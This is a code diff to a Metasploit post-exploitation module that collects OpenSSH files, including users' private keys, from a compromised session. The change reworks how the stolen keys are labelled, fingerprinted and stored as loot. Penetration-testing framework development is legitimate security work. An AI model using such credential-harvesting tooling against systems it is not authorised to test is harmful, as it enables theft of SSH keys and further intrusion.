@@ -106,7 +106,53 @@ class MetasploitModule < Msf::Post
         data = read_file(file_path)
         file = file.split(sep).last
 
-        loot_path = store_loot("ssh.#{file.tr('.', '_')}", 'text/plain', session, data, "ssh_#{file}", "OpenSSH #{file} File")
+        # Consistency with: ./modules/auxiliary/scanner/ssh/ssh_key_login.rb, ./modules/exploits/multi/persistence/ssh_key.rb & ./modules/post/multi/gather/ssh_creds.rb
+        ktype = file[/\Aid_(\w+)\z/, 1]
+        pub_ktype = file[/\Aid_(\w+)\.pub\z/, 1]
+        ltype = if ktype
+                  "ssh.privatekey.#{ktype}"
+                elsif pub_ktype
+                  "ssh.publickey.#{pub_ktype}"
+                else
+                  "ssh.#{user}.#{file.tr('.', '_')}"
+                end
+
+        lname = if ktype
+                  "#{user}_id_#{ktype}"
+                elsif pub_ktype
+                  "#{user}_id_#{pub_ktype}.pub"
+                else
+                  "#{user}_#{file}"
+                end
+
+        linfo = if ktype && data.to_s.include?('PRIVATE KEY')
+                  begin
+                    k = Net::SSH::KeyFactory.load_data_private_key(data, nil, false)
+                    k.fingerprint('SHA256')
+                  rescue StandardError
+                    "OpenSSH #{ktype.upcase} private key for #{user}"
+                  end
+                elsif ktype
+                  "OpenSSH #{ktype.upcase} private key for #{user}"
+                elsif pub_ktype
+                  begin
+                    k = Net::SSH::KeyFactory.load_data_public_key(data.strip)
+                    k.fingerprint('SHA256')
+                  rescue StandardError
+                    "OpenSSH #{pub_ktype.upcase} public key for #{user}"
+                  end
+                else
+                  "OpenSSH #{file} File"
+                end
+
+        loot_path = store_loot(
+          ltype,
+          'text/plain',
+          session,
+          (data.to_s.chomp + "\n"),
+          lname,
+          linfo
+        )
         print_good("Downloaded: #{file_path} -> #{loot_path}")
 
         if file == 'known_hosts'
